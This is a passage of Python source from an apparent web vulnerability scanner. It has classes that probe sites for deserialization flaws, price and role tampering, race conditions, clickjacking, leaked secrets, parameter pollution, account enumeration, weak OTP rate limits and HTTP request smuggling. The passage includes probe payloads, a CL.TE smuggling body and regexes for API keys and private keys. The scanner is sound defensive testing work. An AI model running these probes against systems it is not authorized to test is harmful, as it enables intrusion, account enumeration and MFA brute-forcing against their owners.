            'C:11:"ArrayObject":26:{x:i:0;a:0:{}};',
        ]

        # Java serialization magic bytes (base64 of aced0005)
        self._java_marker_b64 = base64.b64encode(b"\xac\xed\x00\x05").decode()  # "rO0ABQ=="
        self._java_payloads = [
            "rO0ABQ==",           # Java serialized object magic
            "rO0ABXNyAA==",       # Java with sr
        ]

        # Python pickle — harmless probe, just checks if pickle accepted
        self._pickle_marker = base64.b64encode(
            b"\x80\x04\x95\x0e\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x03str\x94\x93\x8c\x01y\x94\x85\x94R\x94."
        ).decode()

        # Detection patterns for deserialization errors
        self._error_patterns = [
            r"unserialize\(\)",
            r"java\.io\..*Exception",
            r"readObject",
            r"org\.apache\.commons",
            r"java\.lang\.ClassNotFoundException",
            r"pickle\.loads",
            r"Serializable",
            r"ObjectInputStream",
            r"__wakeup",
            r"__destruct.*called",
            r"deserialization.*error",
        ]

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
            except Exception:
                return vulns

            # ── Test 1: PHP unserialize in GET/POST params ────────────────────
            for param in list(params.keys())[:self.config.max_params_test]:
                for php_pl in self._php_payloads:
                    try:
                        tp = params.copy()
                        tp[param] = [php_pl]
                        tq = urllib.parse.urlencode(tp, doseq=True)
                        tu = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, tq, parsed.fragment
                        ))
                        r = await client.get(tu, timeout=self.config.vuln_timeout,
                                             follow_redirects=True)
                        for pat in self._error_patterns:
                            if re.search(pat, r.text, re.IGNORECASE) and \
                               not re.search(pat, baseline_text, re.IGNORECASE):
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.DESERIAL,
                                    severity="CRITICAL",
                                    vulnerable_params=[param],
                                    payload_used=php_pl[:80],
                                    evidence=f"Deserialization error pattern '{pat}' triggered — absent from baseline",
                                    details=f"Parameter '{param}' appears to be passed to unserialize() — PHP object injection possible",
                                    subtype="PHP Object Injection",
                                    impact="Attacker can inject malicious PHP objects — may lead to RCE via magic methods __wakeup/__destruct",
                                ))
                                return vulns
                    except Exception:
                        continue

            # ── Test 2: Java serialization in POST body ───────────────────────
            for java_pl in self._java_payloads:
                try:
                    hdrs = random_headers()
                    hdrs["Content-Type"] = "application/octet-stream"
                    raw = base64.b64decode(java_pl + "==")
                    r = await client.post(url, content=raw, headers=hdrs,
                                         timeout=self.config.vuln_timeout,
                                         follow_redirects=True)
                    for pat in self._error_patterns:
                        if re.search(pat, r.text, re.IGNORECASE) and \
                           not re.search(pat, baseline_text, re.IGNORECASE):
                            vulns.append(VulnerabilityResult(
                                url=url,
                                vulnerability_type=VulnerabilityType.DESERIAL,
                                severity="CRITICAL",
                                vulnerable_params=["POST body"],
                                payload_used=java_pl,
                                evidence=f"Java deserialization error pattern '{pat}' found in response",
                                details="Endpoint appears to deserialize Java objects from POST body",
                                subtype="Java Deserialization",
                                impact="Java deserialization RCE via gadget chains (Apache Commons, Spring, etc.)",
                            ))
                            return vulns
                except Exception:
                    continue

            # ── Test 3: Check cookies for serialized data markers ─────────────
            resp_cookies = dict(client.cookies)
            for cookie_name, cookie_val in resp_cookies.items():
                try:
                    # Detect base64 Java serialized marker in cookie
                    decoded = base64.b64decode(cookie_val + "==")
                    if decoded[:2] == b"\xac\xed":
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.DESERIAL,
                            severity="CRITICAL",
                            vulnerable_params=[f"Cookie: {cookie_name}"],
                            payload_used="Detected Java serialized object (aced magic bytes) in cookie",
                            evidence=f"Cookie '{cookie_name}' contains Java serialized data (magic bytes: ac ed 00 05)",
                            details="Java serialized object found in cookie — server likely deserializes this value",
                            subtype="Java Deserialization in Cookie",
                            impact="Attacker can replace cookie with crafted Java gadget chain — RCE possible",
                        ))
                        return vulns
                    # PHP serialized pattern
                    text = cookie_val
                    if re.match(r'^[OCAaibds]:\d+:', text):
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.DESERIAL,
                            severity="HIGH",
                            vulnerable_params=[f"Cookie: {cookie_name}"],
                            payload_used="Detected PHP serialized data pattern in cookie",
                            evidence=f"Cookie '{cookie_name}' appears to contain PHP serialized object: {text[:60]}",
                            details="PHP serialized data in cookie — server likely calls unserialize() on this value",
                            subtype="PHP Deserialization in Cookie",
                            impact="PHP object injection via cookie — magic methods can be abused for RCE",
                        ))
                        return vulns
                except Exception:
                    continue

        except Exception:
            pass
        return vulns


class BusinessLogicScanner:
    """Detects business logic vulnerabilities: price manipulation, negative values, limit bypass."""

    def __init__(self, config: Config):
        self.config = config

        self._price_params = {
            'price', 'amount', 'total', 'cost', 'fee', 'charge',
            'value', 'subtotal', 'discount', 'rate', 'sum',
        }
        self._qty_params = {
            'qty', 'quantity', 'count', 'number', 'amount', 'units',
            'items', 'num', 'q',
        }
        self._role_params = {
            'role', 'type', 'usertype', 'user_type', 'account_type',
            'level', 'permission', 'admin', 'is_admin', 'group',
        }

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
                baseline_status = baseline.status_code
            except Exception:
                return vulns

            for param, vals in list(params.items())[:self.config.max_params_test]:
                name_lower = param.lower()
                orig_val = vals[0] if vals else "1"

                # ── Test 1: Negative price/amount ─────────────────────────────
                if any(p in name_lower for p in self._price_params):
                    for neg_val in ["-1", "-0.01", "-100", "-9999"]:
                        try:
                            tp = params.copy()
                            tp[param] = [neg_val]
                            tq = urllib.parse.urlencode(tp, doseq=True)
                            tu = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, tq, parsed.fragment
                            ))
                            r = await client.get(tu, timeout=self.config.vuln_timeout,
                                                 follow_redirects=True)
                            if r.status_code == 200 and baseline_status == 200:
                                # Look for confirmation of negative amount being accepted
                                _accept_signs = [
                                    neg_val, "added to cart", "success", "ok", "accepted",
                                    "order", "checkout", "confirmed",
                                ]
                                if any(s.lower() in r.text.lower() for s in _accept_signs[:2]):
                                    # Only fire if response clearly different from baseline
                                    if abs(len(r.text) - len(baseline_text)) > 50:
                                        vulns.append(VulnerabilityResult(
                                            url=url,
                                            vulnerability_type=VulnerabilityType.BIZLOGIC,
                                            severity="HIGH",
                                            vulnerable_params=[param],
                                            payload_used=neg_val,
                                            evidence=f"Negative value '{neg_val}' accepted in price/amount field '{param}' — server returned 200",
                                            details=f"Parameter '{param}' accepts negative monetary values without rejection",
                                            subtype="Negative Price Manipulation",
                                            impact="Attacker may be able to purchase items for free or receive refunds by injecting negative prices",
                                        ))
                                        return vulns
                        except Exception:
                            continue

                # ── Test 2: Zero/extreme quantity ─────────────────────────────
                if any(p in name_lower for p in self._qty_params):
                    for qty_val in ["0", "-1", "99999999", "2147483647"]:
                        try:
                            tp = params.copy()
                            tp[param] = [qty_val]
                            tq = urllib.parse.urlencode(tp, doseq=True)
                            tu = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, tq, parsed.fragment
                            ))
                            r = await client.get(tu, timeout=self.config.vuln_timeout,
                                                 follow_redirects=True)
                            if r.status_code == 200 and qty_val in r.text:
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.BIZLOGIC,
                                    severity="MEDIUM",
                                    vulnerable_params=[param],
                                    payload_used=qty_val,
                                    evidence=f"Extreme quantity '{qty_val}' reflected in 200 response without validation error",
                                    details=f"Quantity parameter '{param}' accepts invalid/extreme values",
                                    subtype="Quantity Manipulation",
                                    impact="Integer overflow or free item exploitation possible via extreme/zero quantities",
                                ))
                                return vulns
                        except Exception:
                            continue

                # ── Test 3: Role/privilege escalation ─────────────────────────
                if any(p in name_lower for p in self._role_params):
                    for role_val in ["admin", "administrator", "superuser", "root", "1", "true", "True"]:
                        try:
                            tp = params.copy()
                            orig = tp.get(param, [""])[0].lower()
                            if orig in [role_val.lower(), "admin", "1", "true"]:
                                continue
                            tp[param] = [role_val]
                            tq = urllib.parse.urlencode(tp, doseq=True)
                            tu = urllib.parse.urlunparse((
                                parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, tq, parsed.fragment
                            ))
                            r = await client.get(tu, timeout=self.config.vuln_timeout,
                                                 follow_redirects=True)
                            if r.status_code == 200 and baseline_status == 200:
                                _priv_signs = ["admin panel", "dashboard", "manage", "settings",
                                               "users list", "delete user", "admin access"]
                                if any(s.lower() in r.text.lower() for s in _priv_signs):
                                    vulns.append(VulnerabilityResult(
                                        url=url,
                                        vulnerability_type=VulnerabilityType.BIZLOGIC,
                                        severity="CRITICAL",
                                        vulnerable_params=[param],
                                        payload_used=role_val,
                                        evidence=f"Setting '{param}={role_val}' revealed admin content in response",
                                        details=f"Role/privilege parameter '{param}' can be tampered by client",
                                        subtype="Privilege Escalation via Parameter Tampering",
                                        impact="Attacker can escalate privileges to admin by modifying client-controlled role parameter",
                                    ))
                                    return vulns
                        except Exception:
                            continue

        except Exception:
            pass
        return vulns


class RaceConditionScanner:
    """Detects race condition vulnerabilities by sending concurrent requests."""

    _RACE_PARAMS = {
        'coupon', 'voucher', 'promo', 'code', 'discount', 'token',
        'redeem', 'gift', 'bonus', 'credit', 'points', 'transfer',
        'withdraw', 'apply', 'use', 'claim',
    }

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)

            # Only test if URL has race-candidate params or path keywords
            path_lower = parsed.path.lower()
            has_race_param = any(p.lower() in self._RACE_PARAMS for p in params)
            has_race_path = any(k in path_lower for k in
                                ['redeem', 'coupon', 'checkout', 'transfer', 'vote',
                                 'apply', 'claim', 'use', 'submit', 'purchase'])

            if not has_race_param and not has_race_path:
                return vulns

            # ── Send 10 concurrent identical requests ─────────────────────────
            _N = 10
            async with httpx.AsyncClient(verify=False) as race_client:
                tasks = [
                    race_client.get(url, headers=random_headers(),
                                    timeout=self.config.vuln_timeout,
                                    follow_redirects=True)
                    for _ in range(_N)
                ]
                responses = await asyncio.gather(*tasks, return_exceptions=True)

            valid = [r for r in responses if isinstance(r, httpx.Response)]
            if len(valid) < 3:
                return vulns

            status_codes = [r.status_code for r in valid]
            # Race condition indicator: multiple 200s for a one-time-use endpoint
            ok_count = status_codes.count(200)
            fail_count = sum(1 for s in status_codes if s in (400, 409, 429, 403))

            # If most succeed (>50%) where we'd expect at most 1 to succeed
            if ok_count >= int(_N * 0.5) and fail_count < 2:
                # Compare response bodies — if they're all identical it's just normal behaviour
                bodies = [r.text for r in valid if r.status_code == 200]
                if len(set(bodies)) > 1:
                    # Bodies differ → multiple distinct state changes
                    vulns.append(VulnerabilityResult(
                        url=url,
                        vulnerability_type=VulnerabilityType.RACE,
                        severity="HIGH",
                        vulnerable_params=[parsed.path],
                        payload_used=f"{_N} concurrent identical GET requests",
                        evidence=(
                            f"{ok_count}/{_N} concurrent requests returned 200 with differing bodies — "
                            f"possible TOCTOU/race condition"
                        ),
                        details="Endpoint may lack atomic locking — concurrent requests produce different state changes",
                        subtype="Race Condition (TOCTOU)",
                        impact="Attacker can redeem single-use coupons multiple times, double-spend credits, or bypass rate limits",
                    ))

        except Exception:
            pass
        return vulns


class ClickjackingScanner:
    """Detects clickjacking via missing X-Frame-Options and CSP frame-ancestors."""

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            resp = await client.get(url, timeout=self.config.vuln_timeout,
                                    follow_redirects=True)
            headers = {k.lower(): v for k, v in resp.headers.items()}

            xfo = headers.get("x-frame-options", "").upper()
            csp = headers.get("content-security-policy", "").lower()
            csp_frame = "frame-ancestors" in csp

            # If protected, no issue
            if xfo in ("DENY", "SAMEORIGIN") or csp_frame:
                return vulns

            # Determine if it's an interesting page (has forms or login indicators)
            body_lower = resp.text.lower()
            _interactive = any(s in body_lower for s in [
                '<form', '<input', 'login', 'password', 'submit',
                'account', 'profile', 'dashboard', 'payment', 'transfer',
                'checkout', 'confirm', 'delete', 'change', 'update',
            ])

            severity = "HIGH" if _interactive else "MEDIUM"

            evidence_parts = []
            if not xfo:
                evidence_parts.append("X-Frame-Options: absent")
            elif xfo == "ALLOWALL":
                evidence_parts.append("X-Frame-Options: ALLOWALL (explicitly allows framing)")
                severity = "HIGH"
            else:
                evidence_parts.append(f"X-Frame-Options: '{xfo}' (weak value)")
            if not csp_frame:
                evidence_parts.append("CSP frame-ancestors: absent")

            vulns.append(VulnerabilityResult(
                url=url,
                vulnerability_type=VulnerabilityType.CLICKJACKING,
                severity=severity,
                vulnerable_params=["Response headers"],
                payload_used="Header audit: X-Frame-Options + CSP frame-ancestors",
                evidence=" | ".join(evidence_parts),
                details="Page can be embedded in a cross-origin iframe — clickjacking attack possible",
                subtype="Clickjacking" + (" (Interactive Page)" if _interactive else ""),
                impact=(
                    "Attacker can overlay a transparent iframe over a legitimate page — "
                    "victims unknowingly perform actions (form submissions, clicks, payments)"
                    if _interactive else
                    "Page can be framed — may enable UI redressing or clickjacking on less interactive content"
                ),
            ))

        except Exception:
            pass
        return vulns


class SensitiveDataScanner:
    """Detects sensitive data leaked in HTTP responses: API keys, tokens, passwords, private keys, etc."""

    _PATTERNS = [
        # AWS
        (r"AKIA[0-9A-Z]{16}",                            "AWS Access Key ID",         "CRITICAL"),
        (r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
                                                          "AWS Secret Key",            "CRITICAL"),
        # Generic API keys / tokens
        (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{20,}",
                                                          "API Key",                   "HIGH"),
        (r"(?i)(access[_-]?token|bearer)\s*[:=]\s*['\"]?[A-Za-z0-9_\-\.]{20,}",
                                                          "Access Token",              "HIGH"),
        (r"(?i)(secret[_-]?key|app[_-]?secret)\s*[:=]\s*['\"]?[A-Za-z0-9_\-]{16,}",
                                                          "Secret Key",                "HIGH"),
        # Passwords in source
        (r"(?i)password\s*[:=]\s*['\"][^'\"]{6,}['\"]",  "Password in Source",        "HIGH"),
        (r"(?i)passwd\s*[:=]\s*['\"][^'\"]{6,}['\"]",    "Password in Source",        "HIGH"),
        # Private keys
        (r"-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----",
                                                          "Private Key",               "CRITICAL"),
        # Database connection strings
        (r"(?i)(mysql|postgresql|mongodb|redis|mssql):\/\/[^'\"\s]{10,}",
                                                          "DB Connection String",      "CRITICAL"),
        (r"(?i)jdbc:[a-z]+:\/\/[^'\"\s]{10,}",           "JDBC Connection String",    "CRITICAL"),
        # JWT tokens
        (r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
                                                          "JWT Token",                 "HIGH"),
        # Google / Firebase
        (r"AIza[0-9A-Za-z_\-]{35}",                      "Google API Key",            "HIGH"),
        (r"(?i)firebase['\"]?\s*:\s*['\"]?[A-Za-z0-9_\-]{20,}",
                                                          "Firebase Key",              "HIGH"),
        # GitHub / GitLab tokens
        (r"ghp_[A-Za-z0-9]{36}",                         "GitHub Personal Token",     "CRITICAL"),
        (r"gho_[A-Za-z0-9]{36}",                         "GitHub OAuth Token",        "CRITICAL"),
        (r"glpat-[A-Za-z0-9_\-]{20}",                    "GitLab Personal Token",     "CRITICAL"),
        # Stripe
        (r"sk_live_[A-Za-z0-9]{24,}",                    "Stripe Live Secret Key",    "CRITICAL"),
        (r"pk_live_[A-Za-z0-9]{24,}",                    "Stripe Live Public Key",    "HIGH"),
        # Slack
        (r"xox[baprs]-[A-Za-z0-9\-]{10,}",               "Slack Token",               "HIGH"),
        # Internal IPs in JS / HTML
        (r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b",
                                                          "Internal IP Address",       "MEDIUM"),
        # Email addresses in errors / debug output
        (r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}",
                                                          "Email Address",             "LOW"),
        # Stack traces / debug info
        (r"(?i)(stack trace|traceback|exception in thread|at [a-z]+\.[A-Z][a-zA-Z]+\.)",
                                                          "Stack Trace / Debug Info",  "MEDIUM"),
        # PHP errors
        (r"(?i)(fatal error|parse error|warning:.*?on line \d+)",
                                                          "PHP Error Details",         "MEDIUM"),
        # Twilio
        (r"AC[a-z0-9]{32}",                              "Twilio Account SID",         "HIGH"),
        # SendGrid
        (r"SG\.[a-zA-Z0-9]{22}\.[a-zA-Z0-9]{43}",    "SendGrid API Key",           "HIGH"),
        # NPM
        (r"npm_[A-Za-z0-9]{36}",                         "NPM Token",                  "HIGH"),
        # Docker Hub PAT
        (r"dckr_pat_[A-Za-z0-9_-]{27}",                 "Docker Hub Token",           "HIGH"),
        # DB password in env
        (r"(?i)(DB_PASS|DB_PASSWORD|MYSQL_PASSWORD)\s*=\s*\S{4,}",
                                                          "DB Password in Env",         "CRITICAL"),
        # SSH private key variants
        (r"-----BEGIN OPENSSH PRIVATE KEY-----",          "OpenSSH Private Key",        "CRITICAL"),
        (r"-----BEGIN (DSA|ECDSA|EC) PRIVATE KEY-----",  "DSA/ECDSA Private Key",      "CRITICAL"),
        # HashiCorp Vault tokens
        (r"hvs\.[a-zA-Z0-9]{24,}",                     "Vault Token",                "CRITICAL"),
        # Terraform state secrets
        (r'"sensitive_attributes"\s*:\s*\[',           "Terraform State",            "CRITICAL"),
        # Cloudflare token
        (r"[A-Za-z0-9_-]{40}",                           "Possible API Token (40c)",   "LOW"),
        # Internal paths leaking
        (r"(?i)/home/[a-z]+/|/var/www/|/opt/[a-z]+/",   "Internal Path Disclosure",   "LOW"),
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            resp = await client.get(url, timeout=self.config.vuln_timeout,
                                    follow_redirects=True)
            body = resp.text
            headers_str = str(dict(resp.headers))

            seen_types: set = set()
            for pattern, label, severity in self._PATTERNS:
                for target, src_label in [(body, "response body"), (headers_str, "response headers")]:
                    m = re.search(pattern, target)
                    if m and label not in seen_types:
                        snippet = m.group()[:80]
                        # Mask middle of secret for display
                        if len(snippet) > 12:
                            display = snippet[:6] + "***" + snippet[-4:]
                        else:
                            display = snippet[:3] + "***"
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.SENSITIVE,
                            severity=severity,
                            vulnerable_params=[src_label],
                            payload_used="Passive pattern scan",
                            evidence=f"Pattern '{label}' matched in {src_label}: {display}",
                            details=f"Sensitive data type '{label}' found in {src_label}",
                            subtype=f"Sensitive Data — {label}",
                            impact="Exposed credentials or keys allow direct unauthorized access to systems or accounts",
                        ))
                        seen_types.add(label)
                        break  # one finding per pattern type

        except Exception:
            pass
        return vulns


class HPPScanner:
    """Detects HTTP Parameter Pollution — duplicate params with different values."""

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                return vulns

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_text = baseline.text
                baseline_len  = len(baseline_text)
            except Exception:
                return vulns

            for param, vals in list(params.items())[:self.config.max_params_test]:
                orig = vals[0] if vals else "1"
                # Send param twice with different values
                for second_val in ["0", "2", "admin", "true", "null", "999"]:
                    if second_val == orig:
                        continue
                    try:
                        # Build query with param duplicated
                        base_q = urllib.parse.urlencode(
                            {k: v[0] for k, v in params.items()})
                        dup_q  = f"{base_q}&{param}={second_val}"
                        test_url = urllib.parse.urlunparse((
                            parsed.scheme, parsed.netloc, parsed.path,
                            parsed.params, dup_q, parsed.fragment
                        ))
                        resp = await client.get(test_url, timeout=self.config.vuln_timeout,
                                                follow_redirects=True)
                        body = resp.text

                        # Signal 1: response significantly different → server used second value
                        diff = abs(len(body) - baseline_len)
                        if diff > 200 and (diff / max(baseline_len, 1)) > 0.05:
                            # Check if second value is reflected (server preferred it)
                            if second_val in body and second_val not in baseline_text:
                                vulns.append(VulnerabilityResult(
                                    url=url,
                                    vulnerability_type=VulnerabilityType.HPP,
                                    severity="MEDIUM",
                                    vulnerable_params=[param],
                                    payload_used=f"{param}={orig}&{param}={second_val}",
                                    evidence=(
                                        f"Duplicate param '{param}' with values '{orig}' and '{second_val}' "
                                        f"→ second value reflected in response (Δ{diff}B)"
                                    ),
                                    details=f"Server processes duplicate parameter '{param}' — may use last or first value inconsistently",
                                    subtype="HTTP Parameter Pollution",
                                    impact="Attacker can override intended parameter values — may bypass filters, access controls, or business logic",
                                ))
                                return vulns
                    except Exception:
                        continue

        except Exception:
            pass
        return vulns


class AccountEnumerationScanner:
    """Detects account/user enumeration via different error responses."""

    # Common login / forgot-password endpoint paths
    _AUTH_PATHS = [
        "/login", "/signin", "/sign-in", "/auth", "/authenticate",
        "/api/login", "/api/signin", "/api/auth",
        "/forgot-password", "/forgot_password", "/reset-password",
        "/api/forgot-password", "/api/users/login",
        "/user/login", "/account/login", "/members/login",
    ]

    # Fake emails to probe with
    _EXISTING_PROBE   = "admin@example.com"
    _NONEXISTENT_PROBE = f"y2s_nonexistent_{uuid.uuid4().hex[:8]}@y2s-probe-no-reply.invalid"

    _ENUM_SIGNALS = [
        r"(user|account|email).{0,30}(not found|doesn.t exist|no account)",
        r"(incorrect|wrong).{0,20}password",
        r"password.*incorrect",
        r"we (couldn.t find|don.t have).*account",
        r"no user.*found",
        r"email.*registered",
        r"that email.*not.*registered",
        r"invalid (email|username)",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            for path in self._AUTH_PATHS:
                target = base + path
                try:
                    # Probe with non-existent email (GET first to see if endpoint exists)
                    r_check = await client.get(target, timeout=8, follow_redirects=True)
                    if r_check.status_code not in (200, 405):
                        continue

                    # POST with non-existent user
                    for email_field in ["email", "username", "user", "login"]:
                        for pass_field in ["password", "pass", "passwd"]:
                            data_nonexist = {email_field: self._NONEXISTENT_PROBE, pass_field: "WrongPass123!"}
                            data_exist    = {email_field: self._EXISTING_PROBE,    pass_field: "WrongPass123!"}
                            try:
                                hdrs = random_headers()
                                hdrs["Content-Type"] = "application/x-www-form-urlencoded"

                                r_ne = await client.post(target, data=data_nonexist, headers=hdrs,
                                                         timeout=self.config.vuln_timeout,
                                                         follow_redirects=True)
                                r_ex = await client.post(target, data=data_exist, headers=hdrs,
                                                         timeout=self.config.vuln_timeout,
                                                         follow_redirects=True)

                                body_ne = r_ne.text.lower()
                                body_ex = r_ex.text.lower()

                                # Different status codes = clear enumeration
                                if r_ne.status_code != r_ex.status_code:
                                    vulns.append(VulnerabilityResult(
                                        url=target,
                                        vulnerability_type=VulnerabilityType.ENUM,
                                        severity="MEDIUM",
                                        vulnerable_params=[email_field],
                                        payload_used=f"POST {path} with valid vs invalid email",
                                        evidence=(
                                            f"Non-existent user → HTTP {r_ne.status_code}, "
                                            f"existing probe → HTTP {r_ex.status_code} — status codes differ"
                                        ),
                                        details=f"Endpoint '{path}' leaks user existence via different HTTP status codes",
                                        subtype="Account Enumeration (Status Code)",
                                        impact="Attacker can enumerate valid usernames/emails for targeted attacks or credential stuffing",
                                    ))
                                    return vulns

                                # Different error messages = enumeration
                                ne_signals = [s for s in self._ENUM_SIGNALS if re.search(s, body_ne, re.IGNORECASE)]
                                ex_signals = [s for s in self._ENUM_SIGNALS if re.search(s, body_ex, re.IGNORECASE)]
                                if ne_signals != ex_signals or (ne_signals and body_ne != body_ex):
                                    len_diff = abs(len(body_ne) - len(body_ex))
                                    if len_diff > 20:
                                        vulns.append(VulnerabilityResult(
                                            url=target,
                                            vulnerability_type=VulnerabilityType.ENUM,
                                            severity="MEDIUM",
                                            vulnerable_params=[email_field],
                                            payload_used=f"POST {path} with valid vs invalid email",
                                            evidence=(
                                                f"Response differs by {len_diff}B between existing/non-existing user. "
                                                f"Signals in non-exist: {ne_signals[:1]}"
                                            ),
                                            details=f"Login endpoint '{path}' reveals whether an account exists via different error messages",
                                            subtype="Account Enumeration (Error Message)",
                                            impact="Attacker can determine valid email addresses for phishing or credential attacks",
                                        ))
                                        return vulns

                            except Exception:
                                continue
                except Exception:
                    continue

        except Exception:
            pass
        return vulns


class MFABypassScanner:
    """Detects weak 2FA/OTP implementations: no rate limit, reuse, brute-force."""

    _OTP_PATHS = [
        "/verify", "/otp", "/2fa", "/mfa", "/code",
        "/api/verify", "/api/otp", "/api/2fa", "/api/mfa",
        "/verify-otp", "/verify_otp", "/confirm",
        "/api/verify-code", "/api/confirm",
    ]

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"

            for path in self._OTP_PATHS:
                target = base + path
                try:
                    r_check = await client.get(target, timeout=8, follow_redirects=True)
                    if r_check.status_code not in (200, 405, 400):
                        continue

                    # ── Test 1: No rate limit — send 10 wrong OTPs fast ──────
                    wrong_codes = ["000000", "111111", "123456", "999999",
                                   "000001", "123123", "654321", "111000",
                                   "000111", "010101"]
                    responses = []
                    for code in wrong_codes:
                        try:
                            for field in ["code", "otp", "token", "pin"]:
                                r = await client.post(
                                    target,
                                    data={field: code},
                                    headers=random_headers(),
                                    timeout=5,
                                    follow_redirects=True
                                )
                                responses.append(r.status_code)
                                break
                        except Exception:
                            continue

                    if len(responses) >= 8:
                        # If all returned same non-lockout code → no rate limiting
                        locked = any(s in (429, 423, 403) for s in responses)
                        all_same = len(set(responses)) == 1
                        if not locked and all_same and responses[0] in (200, 400, 401, 422):
                            vulns.append(VulnerabilityResult(
                                url=target,
                                vulnerability_type=VulnerabilityType.MFA_BYPASS,
                                severity="HIGH",
                                vulnerable_params=[path],
                                payload_used=f"10 wrong OTP codes — all returned HTTP {responses[0]}",
                                evidence=(
                                    f"Sent {len(responses)} incorrect OTP codes to '{path}' — "
                                    f"no lockout or rate limit detected (all returned {responses[0]})"
                                ),
                                details=f"OTP endpoint '{path}' has no rate limiting — brute-force possible",
                                subtype="2FA/OTP — No Rate Limit",
                                impact="Attacker can brute-force 6-digit OTP (1,000,000 combinations) without lockout",
                            ))
                            return vulns

                    # ── Test 2: OTP length = 4 digits (weak) ─────────────────
                    r_short = await client.post(
                        target, data={"code": "1234"},
                        headers=random_headers(), timeout=5,
                        follow_redirects=True
                    )
                    if r_short.status_code in (200, 400, 401, 422):
                        body = r_short.text.lower()
                        if not any(w in body for w in ["invalid length", "must be 6", "6 digit"]):
                            vulns.append(VulnerabilityResult(
                                url=target,
                                vulnerability_type=VulnerabilityType.MFA_BYPASS,
                                severity="MEDIUM",
                                vulnerable_params=[path],
                                payload_used="code=1234 (4 digits)",
                                evidence=f"Endpoint accepted 4-digit OTP without 'invalid length' rejection",
                                details=f"OTP endpoint '{path}' may accept short codes — reduces brute-force space",
                                subtype="2FA/OTP — Weak Length Validation",
                                impact="Shorter OTP significantly reduces brute-force complexity",
                            ))
                            return vulns

                except Exception:
                    continue

        except Exception:
            pass
        return vulns


class HTTPSmugglingScanner:
    """Detects HTTP Request Smuggling via CL.TE and TE.CL probes."""

    def __init__(self, config: Config):
        self.config = config

    async def scan_url(self, client: httpx.AsyncClient, url: str) -> List[VulnerabilityResult]:
        vulns = []
        try:
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            try:
                baseline = await client.get(url, timeout=self.config.vuln_timeout,
                                            follow_redirects=True)
                baseline_status = baseline.status_code
                baseline_len    = len(baseline.text)
            except Exception:
                return vulns

            # ── Probe 1: CL.TE — frontend uses Content-Length, backend uses TE ──
            # Send a request where CL says 6 but TE says chunked with poison data
            # If backend processes "G" as start of next request → timeout or 400
            cl_te_body = b"1\r\nG\r\n0\r\n\r\n"
            cl_te_headers = {
                "Content-Type":    "application/x-www-form-urlencoded",
                "Content-Length":  str(len(cl_te_body)),
                "Transfer-Encoding": "chunked",
            }
            cl_te_headers.update(random_headers())

            try:
                async with httpx.AsyncClient(verify=False, timeout=12) as raw_client:
                    r_cl_te = await raw_client.post(
                        url, content=cl_te_body, headers=cl_te_headers
                    )
                    # Follow-up request — if smuggled, this should get 400 or timeout
                    r_followup = await raw_client.get(url, headers=random_headers(),
                                                      timeout=8)

                    if r_followup.status_code == 400 and baseline_status != 400:
                        vulns.append(VulnerabilityResult(
                            url=url,
                            vulnerability_type=VulnerabilityType.SMUGGLING,
                            severity="CRITICAL",
                            vulnerable_params=["HTTP pipeline"],
                            payload_used="CL.TE probe: Content-Length + Transfer-Encoding: chunked",
                            evidence=(
                                f"Follow-up request returned 400 after CL.TE probe "
